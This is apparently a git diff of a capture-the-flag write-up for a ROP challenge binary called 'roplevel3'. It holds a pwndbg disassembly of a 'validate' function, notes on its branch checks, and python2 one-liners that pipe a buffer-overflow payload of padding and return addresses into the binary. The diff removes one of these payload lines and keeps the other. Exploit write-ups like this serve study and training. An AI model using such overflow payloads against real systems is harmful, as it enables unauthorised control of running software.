@@ -1,3 +1,6 @@
+### Analysis
+
+```
 pwndbg> disas validate
 Dump of assembler code for function validate:
    0x0804928b <+0>:	push   ebp
@@ -49,31 +52,45 @@ Dump of assembler code for function validate:
    0x0804931f <+148>:	leave  
    0x08049320 <+149>:	ret    
 End of assembler dump.
+```
 
-0x080492ae <+35>:	jne    0x80492b7 <validate+44>
-checks if the number is 1, 
-if it is call func then ret and jmp to validate+144 (end)
-if it is not jmp to validate+44 and continue
+>0x080492ae <+35>:	jne    0x80492b7 <validate+44>
+>
+>checks if the number is 1, 
+>
+>if it is call func then ret and jmp to validate+144 (end)
+>
+>if it is not jmp to validate+44 and continue
+>
+> </br>
+>0x080492cb <+64>:	jne    0x80492ef <validate+100> 
+>
+>Checks if the number is 2,
+>
+>if it is continue
+>
+>if it is not jmp to 100
+>
+> </br>
+>0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
+>
+>check if eax is not 0
+>
+>if eax is not 0 then execute internal_func
+>
+>if eax is 0 then jmp to validate+144 (end)
+>
+> </br>
+>0x08049303 <+120>:	jne    0x804930c <validate+129>
+>
+>check if number is 3
+>
+>if it is 3 then continue and eventually exit
+>
+>if it is not 3 then continue to validate+129 then to validate+144 (end)
 
-0x080492cb <+64>:	jne    0x80492ef <validate+100> 
-Checks if the number is 2,
-if it is continue
-if it is not jmp to 100
+### Answer:
 
-0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
-check if eax is not 0
-if eax is not 0 then execute internal_func
-if eax is 0 then jmp to validate+144 (end)
-
-0x08049303 <+120>:	jne    0x804930c <validate+129>
-check if number is 3
-if it is 3 then continue and eventually exit
-if it is not 3 then continue to validate+129 then to validate+144 (end)
-
-
-
-
-python2 -c "print('ZZZZYYYY' + '\x01\x00\x00\x00' + 'VVVV' + 'BBBB' + '\x33\x93\x04\x08' + 'CCCC' + '\x21\x93\x04\x08' + '\x99\x93\x04\x08')" > /tmp/output 
 
 
 (python2 -c "print('ZZZZYYYYXXXXVVVV' + 'BBBB' + '\x33\x93\x04\x08' + 'CCCC' + '\x21\x93\x04\x08' + '\x44\x93\x04\x08')" ; cat)  | ./roplevel3
